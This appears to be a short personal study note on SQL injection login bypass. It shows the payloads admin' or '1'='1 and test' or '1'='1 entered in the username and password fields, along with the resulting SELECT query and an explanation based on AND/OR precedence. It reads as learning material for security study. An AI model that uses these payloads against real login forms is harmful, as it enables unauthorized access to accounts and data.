#SQL_Injection

---

- To do an injection using username we use the following syntax:
```sql
admin' or '1'='1
```
which yields the following SQL query:
```sql
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```
which returns true since **AND** has higher precedence than **OR**

![[Pasted image 20241028212131.png]]

- However, if we don't know any valid username, we can do an injection using the password field as follows:
```sql
test' or '1'='1
```

which yields the following query:

![[Pasted image 20241028212334.png]]

![[Pasted image 20241028212338.png]]
